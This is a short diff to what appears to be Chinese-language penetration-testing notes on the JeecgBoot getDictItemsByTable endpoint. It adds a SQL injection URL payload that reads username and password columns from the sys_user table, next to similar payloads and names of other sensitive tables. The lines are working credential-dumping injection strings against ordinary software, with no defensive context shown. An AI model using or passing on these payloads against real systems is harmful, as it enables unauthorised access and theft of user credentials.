@@ -133,6 +133,7 @@ getDictItemsByTable注入分析：<https://xz.aliyun.com/t/13186?time__1311=Gqmh
 sql注入账号密码查询。若报错可报项目路径
 /sys/ng-alain/getDictItemsByTable/sys_user/username/password
 /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js
+/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/username,password%20'/x.js
 
 sys_third_app_config
 sys_data_source
